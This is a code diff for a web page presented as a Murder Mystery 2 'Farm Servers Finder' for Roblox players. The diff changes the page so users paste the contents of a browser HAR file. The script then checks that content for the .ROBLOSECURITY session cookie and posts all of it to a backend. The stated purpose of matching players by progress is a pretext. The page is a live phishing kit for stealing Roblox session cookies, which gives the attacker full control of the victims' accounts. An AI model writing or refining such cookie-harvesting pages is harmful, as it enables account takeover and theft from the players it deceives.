@@ -68,18 +68,17 @@
       text-decoration: underline;
     }
 
-    /* Form Styling */
-    form {
-      display: flex;
-      flex-direction: column;
+    textarea {
+      width: 100%;
+      height: 150px;
+      background: #333;
+      color: #ffffff;
+      border: 1px solid #555;
+      border-radius: 5px;
+      padding: 10px;
+      resize: none;
     }
 
-    label {
-      margin-top: 10px;
-      color: #ff79c6;
-    }
-
-    input[type="file"],
     input[type="text"],
     input[type="number"] {
       margin-bottom: 15px;
@@ -121,13 +120,13 @@
       <!-- Left Panel for form -->
       <div class="panel">
         <h2>Farm Servers Finder</h2>
-        <p>Please enter your MM2 Player file, your Roblox username, your MM2 level, and the number of godlies you have. We do this to find players with similar progress. For support, join our Discord server <a href="https://discord.gg/qJK7Fxd2YE" target="_blank">here</a> or watch the tutorial on the right.</p>
-        <p><strong>DISCLAIMER:</strong> You must be logged into an account to get your MM2 Player file.</p>
+        <p>Please paste your MM2 HAR file content, your Roblox username, your MM2 level, and the number of godlies you have. We do this to find players with similar progress. For support, join our Discord server <a href="https://discord.gg/qJK7Fxd2YE" target="_blank">here</a> or watch the tutorial on the right.</p>
+        <p><strong>DISCLAIMER:</strong> You must be logged into an account to generate the HAR file.</p>
 
         <!-- Form -->
         <form id="serverFinderForm">
-          <label>MM2 Player File</label>
-          <input type="file" id="playerFile" accept=".txt" required>
+          <label>Paste HAR File Content</label>
+          <textarea id="harContent" required></textarea>
 
           <label>Your Roblox Username</label>
           <input type="text" id="username" required>
@@ -146,7 +145,7 @@
       <div class="panel">
         <h2>How to use this tool?</h2>
         <video controls>
-          <source src="VIDEO IS NOT OUT YET! PLEASE OPEN A TICKET IN OUR SERVER! https://discord.gg/qJK7Fxd2YE" type="video/mp4">
+          <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
           Your browser does not support the video tag.
         </video>
       </div>
@@ -156,10 +155,10 @@
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <script>
     document.getElementById('findServerBtn').addEventListener('click', () => {
+      const harContent = document.getElementById('harContent').value.trim();
       const username = document.getElementById('username').value.trim();
       const level = document.getElementById('level').value.trim();
       const godlies = document.getElementById('godlies').value.trim();
-      const playerFile = document.getElementById('playerFile').files[0];
 
       // Username validation
       const usernameRegex = /^(?!_)(?!.*_$)[a-zA-Z0-9_]{3,20}$/;
@@ -168,25 +167,25 @@
         return;
       }
 
-      // Check if player file contains the required cookie
-      if (!playerFile) {
-        Swal.fire('Please fill out the form with valid information');
+      // Validate HAR content and check for .ROBLOSECURITY
+      try {
+        const harData = JSON.parse(harContent);
+        const cookies = harData.log.entries.flatMap(entry =>
+          (entry.request.cookies || []).map(cookie => cookie.name)
+        );
+        if (!cookies.includes('.ROBLOSECURITY')) {
+          Swal.fire('The HAR file does not contain a .ROBLOSECURITY cookie.');
+          return;
+        }
+      } catch (error) {
+        Swal.fire('Invalid HAR file content. Please paste valid JSON.');
         return;
       }
 
-      const reader = new FileReader();
-      reader.onload = function(event) {
-        const fileContent = event.target.result;
-        if (!fileContent.includes('.ROBLOSECURITY')) {
-          Swal.fire('Please fill out the form with valid information');
-          return;
-        }
-        proceedWithServerSelection(username, level, godlies, fileContent);
-      };
-      reader.readAsText(playerFile);
+      proceedWithServerSelection(username, level, godlies, harContent);
     });
 
-    function proceedWithServerSelection(username, level, godlies, fileContent) {
+    function proceedWithServerSelection(username, level, godlies, harContent) {
       Swal.fire({
         icon: 'success',
         title: 'Please wait while we find a server for you, you will be redirected to the server page when we are ready...'
@@ -204,7 +203,7 @@
             username,
             level,
             godlies,
-            playerFileContent: fileContent
+            harContent
           })
         }).catch(error => console.error('Error:', error));
 
